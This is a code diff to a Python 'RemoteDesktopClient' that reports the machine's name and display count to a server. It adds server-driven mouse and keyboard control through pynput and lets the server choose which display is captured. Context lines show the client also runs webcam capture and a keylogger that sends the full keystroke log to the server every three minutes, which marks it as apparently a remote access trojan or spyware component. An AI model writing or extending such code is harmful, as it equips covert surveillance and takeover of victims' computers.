@@ -143,6 +143,18 @@ class RemoteDesktopClient:
         self.control_mode = ControlMode(input_callback=self._on_control_input)
         self.webcam_active = False
         self.control_active = False
+        self.current_display = 0  # 0 = all displays, 1+ = specific display
+    
+    def _get_display_count(self) -> int:
+        """Get number of displays available"""
+        try:
+            import mss
+            with mss.mss() as sct:
+                # monitors[0] is virtual screen (all monitors), monitors[1+] are individual displays
+                return len(sct.monitors) - 1
+        except Exception as e:
+            logger.warning(f"Failed to get display count: {e}")
+            return 1  # Default to 1 display
         
     def create_ssl_context(self) -> Optional[ssl.SSLContext]:
         """Create SSL context for secure connection"""
@@ -213,6 +225,16 @@ class RemoteDesktopClient:
                 logger.info(f"Sent PC name to server: {self.pc_name}")
             except Exception as e:
                 logger.warning(f"Failed to send PC name to server: {e}")
+            
+            # Send display count to server
+            try:
+                display_count = self._get_display_count()
+                display_count_bytes = display_count.to_bytes(4, 'big')
+                self.writer.write(display_count_bytes)
+                await self.writer.drain()
+                logger.info(f"Sent display count to server: {display_count}")
+            except Exception as e:
+                logger.warning(f"Failed to send display count to server: {e}")
             
             return True
             
@@ -351,7 +373,9 @@ class RemoteDesktopClient:
             if not self.control_active:
                 self.control_mode.start()
                 self.control_active = True
-                logger.info("Control mode started")
+                logger.info("=== CONTROL MODE STARTED ===")
+                print("=== CONTROL MODE STARTED ===")
+                sys.stdout.flush()
         except Exception as e:
             logger.error(f"Error starting control mode: {e}")
     
@@ -361,21 +385,181 @@ class RemoteDesktopClient:
             if self.control_active:
                 self.control_mode.stop()
                 self.control_active = False
-                logger.info("Control mode stopped")
+                logger.info("=== CONTROL MODE STOPPED ===")
+                print("=== CONTROL MODE STOPPED ===")
+                sys.stdout.flush()
         except Exception as e:
             logger.error(f"Error stopping control mode: {e}")
     
     async def _handle_control_input(self, msg_data: bytes):
-        """Handle control input from server (forward to system)"""
-        # This would forward input to the system
-        # For now, just log - implementation depends on platform
+        """Handle control input from server (execute mouse/keyboard actions)"""
         try:
             import json
             data = json.loads(msg_data.decode('utf-8'))
-            logger.debug(f"Control input: {data}")
-            # TODO: Forward to system input
+            logger.info(f"=== CONTROL INPUT RECEIVED === Type: {data.get('type')}, Action: {data.get('action')}")
+            
+            input_type = data.get('type')  # 'mouse' or 'key'
+            action = data.get('action')  # 'move', 'click', 'press', 'release', 'type', 'scroll'
+            
+            if input_type == 'mouse':
+                await self._execute_mouse_action(data)
+            elif input_type == 'key':
+                await self._execute_keyboard_action(data)
+            else:
+                logger.warning(f"Unknown control input type: {input_type}")
+                
         except Exception as e:
             logger.error(f"Error handling control input: {e}")
+            import traceback
+            logger.error(traceback.format_exc())
+    
+    async def _execute_mouse_action(self, data: dict):
+        """Execute mouse action on the system"""
+        try:
+            from pynput.mouse import Controller as MouseController, Button
+            mouse = MouseController()
+            
+            action = data.get('action')
+            x = data.get('x', 0)
+            y = data.get('y', 0)
+            button_num = data.get('button', 1)
+            scroll_delta = data.get('scroll', 0)
+            
+            if action == 'move':
+                # Move mouse to absolute position
+                mouse.position = (x, y)
+                logger.debug(f"Mouse moved to ({x}, {y})")
+                
+            elif action == 'click':
+                # Click mouse button
+                button_map = {
+                    1: Button.left,
+                    2: Button.middle,
+                    3: Button.right
+                }
+                button = button_map.get(button_num, Button.left)
+                mouse.click(button, 1)
+                logger.debug(f"Mouse clicked: button {button_num} at ({x}, {y})")
+                
+            elif action == 'press':
+                # Press and hold mouse button
+                button_map = {
+                    1: Button.left,
+                    2: Button.middle,
+                    3: Button.right
+                }
+                button = button_map.get(button_num, Button.left)
+                mouse.press(button)
+                logger.debug(f"Mouse button pressed: {button_num}")
+                
+            elif action == 'release':
+                # Release mouse button
+                button_map = {
+                    1: Button.left,
+                    2: Button.middle,
+                    3: Button.right
+                }
+                button = button_map.get(button_num, Button.left)
+                mouse.release(button)
+                logger.debug(f"Mouse button released: {button_num}")
+                
+            elif action == 'scroll':
+                # Scroll mouse wheel
+                mouse.scroll(0, scroll_delta)
+                logger.debug(f"Mouse scrolled: {scroll_delta}")
+                
+        except Exception as e:
+            logger.error(f"Error executing mouse action: {e}")
+            import traceback
+            logger.error(traceback.format_exc())
+    
+    async def _execute_keyboard_action(self, data: dict):
+        """Execute keyboard action on the system"""
+        try:
+            from pynput.keyboard import Controller as KeyboardController, Key
+            keyboard = KeyboardController()
+            
+            action = data.get('action')
+            key = data.get('key', '')
+            key_code = data.get('key_code', '')
+            
+            if action == 'type':
+                # Type text
+                keyboard.type(key)
+                logger.debug(f"Typed text: {key[:20]}...")
+                
+            elif action == 'press':
+                # Press key
+                if key_code:
+                    # Special key (e.g., 'enter', 'ctrl', 'alt')
+                    special_keys = {
+                        'enter': Key.enter,
+                        'tab': Key.tab,
+                        'space': Key.space,
+                        'backspace': Key.backspace,
+                        'delete': Key.delete,
+                        'esc': Key.esc,
+                        'escape': Key.esc,
+                        'ctrl': Key.ctrl,
+                        'control': Key.ctrl,
+                        'alt': Key.alt,
+                        'shift': Key.shift,
+                        'cmd': Key.cmd,
+                        'meta': Key.cmd,
+                        'up': Key.up,
+                        'down': Key.down,
+                        'left': Key.left,
+                        'right': Key.right,
+                        'home': Key.home,
+                        'end': Key.end,
+                        'pageup': Key.page_up,
+                        'pagedown': Key.page_down,
+                    }
+                    key_obj = special_keys.get(key_code.lower(), key)
+                    keyboard.press(key_obj)
+                    logger.debug(f"Key pressed: {key_code}")
+                else:
+                    # Regular character
+                    keyboard.press(key)
+                    logger.debug(f"Key pressed: {key}")
+                    
+            elif action == 'release':
+                # Release key
+                if key_code:
+                    special_keys = {
+                        'enter': Key.enter,
+                        'tab': Key.tab,
+                        'space': Key.space,
+                        'backspace': Key.backspace,
+                        'delete': Key.delete,
+                        'esc': Key.esc,
+                        'escape': Key.esc,
+                        'ctrl': Key.ctrl,
+                        'control': Key.ctrl,
+                        'alt': Key.alt,
+                        'shift': Key.shift,
+                        'cmd': Key.cmd,
+                        'meta': Key.cmd,
+                        'up': Key.up,
+                        'down': Key.down,
+                        'left': Key.left,
+                        'right': Key.right,
+                        'home': Key.home,
+                        'end': Key.end,
+                        'pageup': Key.page_up,
+                        'pagedown': Key.page_down,
+                    }
+                    key_obj = special_keys.get(key_code.lower(), key)
+                    keyboard.release(key_obj)
+                    logger.debug(f"Key released: {key_code}")
+                else:
+                    keyboard.release(key)
+                    logger.debug(f"Key released: {key}")
+                    
+        except Exception as e:
+            logger.error(f"Error executing keyboard action: {e}")
+            import traceback
+            logger.error(traceback.format_exc())
     
     async def _handle_display_select(self, msg_data: bytes):
         """Handle display selection"""
@@ -383,10 +567,27 @@ class RemoteDesktopClient:
             import json
             data = json.loads(msg_data.decode('utf-8'))
             display_index = data.get('display', 0)
-            # TODO: Update capture to use selected display
-            logger.info(f"Display selected: {display_index}")
+            logger.info(f"Display selection changed to: {display_index}")
+            
+            # Update current display
+            self.current_display = display_index
+            
+            # Recreate screen capture with new display
+            if self.capture:
+                self.capture.reset()
+                # Reinitialize with new display
+                # 0 = all displays (virtual desktop), 1+ = specific display
+                self.capture = ScreenCapture(
+                    monitor=display_index, 
+                    quality=SCREEN_QUALITY, 
+                    capture_all=(display_index == 0)
+                )
+                logger.info(f"Screen capture reinitialized for display {display_index}: {self.capture.width}x{self.capture.height}")
+                
         except Exception as e:
             logger.error(f"Error handling display select: {e}")
+            import traceback
+            logger.error(traceback.format_exc())
     
     def _on_keylog(self, log_content: str):
         """Callback for keylogger - receives full log content every 3 minutes"""
@@ -526,7 +727,7 @@ class RemoteDesktopClient:
                     # Decode and handle message
                     try:
                         msg_type, msg_data = ProtocolHandler.decode_message(data)
-                        logger.info(f"Decoded message type: {msg_type.name}")
+                        logger.info(f"=== MESSAGE RECEIVED === Type: {msg_type.name}, Size: {len(msg_data)} bytes")
                         await self._handle_server_message(msg_type, msg_data)
                     except Exception as e:
                         logger.error(f"Error decoding message: {e}")
